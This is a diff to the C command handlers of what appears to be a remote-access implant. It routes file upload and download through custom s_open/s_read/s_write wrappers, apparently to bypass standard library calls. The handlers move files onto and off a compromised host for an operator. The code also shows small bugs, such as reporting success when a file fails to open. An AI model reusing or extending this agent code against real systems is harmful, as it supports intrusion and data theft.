@@ -1,5 +1,6 @@
 #include "Commands.h"
 #include "../Common/shaco_stdlib.h"
+#include "../Common/Network.h"
 #include "../Config/Settings.h"
 #include "../Config/OSConfig.h"
 #include "../Helpers/Http.h"
@@ -285,15 +286,15 @@ PPACKER upload_command(uint8_t *args){
     strip_end(filepath);
     PPACKER pack = packer_init();
 
-    int fd = open(filepath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    int fd = s_open(filepath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
     if (fd < 0){MSG("can't open filepath %s", filepath); packer_add_int32(pack, RESPONSE_UPLOAD_SUCCESS); return pack;}
-    if(write(fd, data, data_len) < 0){
+    if(s_write(fd, data, data_len) < 0){
         MSG("can't write on the file");
         packer_add_int32(pack,RESPONSE_UPLOAD_ERROR); 
         return pack;
     }
 
-    close(fd);
+    s_close(fd);
     packer_add_int32(pack, RESPONSE_UPLOAD_SUCCESS);
     return pack;
 }
@@ -308,7 +309,7 @@ PPACKER download_command(uint8_t * args){
         file[StringLength(file) - 1 ] = '\0';
 
     PPACKER pack = packer_init();
-    int fd = open(file, O_RDONLY);
+    int fd = s_open(file, O_RDONLY, 0);
     if(fd < 0){
         MSG("can't open the file %s", file);
         response = RESPONSE_DOWNLOAD_ERROR;
@@ -320,7 +321,7 @@ PPACKER download_command(uint8_t * args){
     void *tmp = NULL;
     buff = (uint8_t *)shaco_malloc(READ_SIZE);
 
-    while((nread = read(fd, buff + current, READ_SIZE)) > 0){
+    while((nread = s_read(fd, buff + current, READ_SIZE)) > 0){
         current += nread;
         tmp = shaco_realloc(buff, current + READ_SIZE);
         if(!tmp){
@@ -354,6 +355,6 @@ EXIT:
         }
         shaco_free(buff); 
     } 
-    if(fd >= 0) close(fd);
+    if(fd >= 0) s_close(fd);
     return pack;
 }
